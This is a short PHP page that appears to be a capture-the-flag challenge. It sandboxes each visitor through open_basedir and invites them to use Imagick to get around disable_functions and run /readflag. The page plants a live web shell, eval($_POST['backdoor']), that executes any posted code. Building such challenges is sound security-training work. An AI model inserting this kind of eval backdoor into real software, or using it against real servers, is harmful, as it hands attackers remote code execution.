<?php
$dir = "/tmp/" . md5("$_SERVER[REMOTE_ADDR]");
mkdir($dir);
ini_set('open_basedir', '/var/www/html:' . $dir);
?>
<!DOCTYPE html><html><head><style>.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}</style></head><body>
<pre class="pre"><code>Imagick is a awesome library for hackers to break `disable_functions`.
So I installed php-imagick in the server, opened a `backdoor` for you.
Let's try to execute `/readflag` to get the flag.
Open basedir: <?php echo ini_get('open_basedir');?>

<?php eval($_POST["backdoor"]);?>
Hint: eval($_POST["backdoor"]);
</code></pre></body>
